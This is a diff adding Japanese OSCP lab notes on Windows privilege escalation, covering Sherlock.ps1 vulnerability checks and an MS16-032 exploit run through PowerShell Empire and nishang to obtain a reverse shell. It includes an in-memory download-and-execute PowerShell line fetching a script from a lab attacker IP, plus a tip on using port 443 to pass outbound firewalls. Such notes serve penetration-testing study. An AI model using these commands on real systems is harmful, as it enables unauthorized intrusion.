@@ -104,4 +104,83 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
   
     ![image-20230106102420092](img/WindowsKernelVulunerabilities/image-20230106102420092.png)
   
-    
+
+
+
+## Sherlock.ps1
+
+https://www.youtube.com/watch?v=kWTnVBIpNsE
+
+脆弱性判定のpowerscriptモジュール. winpeasでもおそらくこのスクリプトをうごかしているのではないか。
+
+* ファイルをコピーする
+
+  ```bash
+  cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1 ~/Documents/OSCP/LAB/10.11.1.50/ 
+  ```
+
+* 関数を検索する
+
+  ```
+  grep -i function Sherlock.ps1 
+  ```
+
+* 実行したい関数をSherlock.ps1の末尾に追加する
+
+  ```
+  vi Sherlock.ps1
+  ```
+
+  ![image-20230204233551297](img/WindowsKernelVulunerabilities/image-20230204233551297.png)
+
+* powershellをメモリに読み込んで実行する
+
+  ```powershell
+  iex(new-object net.webclient).downloadstring('http://192.168.119.167/Sherlock.ps1')
+  ```
+
+
+
+## MS16-032
+
+* 以下脆弱性が見つかる
+
+  ```
+  Title      : Secondary Logon Handle
+  MSBulletin : MS16-032
+  CVEID      : 2016-0099
+  Link       : https://www.exploit-db.com/exploits/39719/
+  VulnStatus : Appears Vulnerable
+  ```
+
+* powershell empireにcmd.exe用ではなくCLIでリバースシェルを取得できるソースコードがあり、それを編集する
+
+  * 以下からコピーする
+
+    ```
+    /usr/share/powershell-empire/empire/server/data/module_source/privesc
+    ```
+
+  * `Invoke-MS16032.ps1`を編集する
+
+    ![image-20230204233828295](img/WindowsKernelVulunerabilities/image-20230204233828295.png)
+
+    パラメータが以下と定義されている。powershellの場合paramで定義したデータはオプションとして設定できる仕様
+
+    <img src="img/WindowsKernelVulunerabilities/image-20230204233920367.png" alt="image-20230204233920367" style="zoom:50%;" />
+
+  * 実行用のshell.ps1についてはnishangの`Invoke-PowerShellTCP.ps1`をコピーした。
+
+    ![image-20230204234029031](img/WindowsKernelVulunerabilities/image-20230204234029031.png)
+
+    ※4444だとファイアウォールに拒否されてしまっていた。443はアウトバンド許可されている
+
+* シェルが実行されリバースシェルが取得できる
+
+  ![image-20230204234147297](img/WindowsKernelVulunerabilities/image-20230204234147297.png)
+
+  ![image-20230204234200141](img/WindowsKernelVulunerabilities/image-20230204234200141.png)
+
+  ![image-20230204234207223](img/WindowsKernelVulunerabilities/image-20230204234207223.png)
+
+  
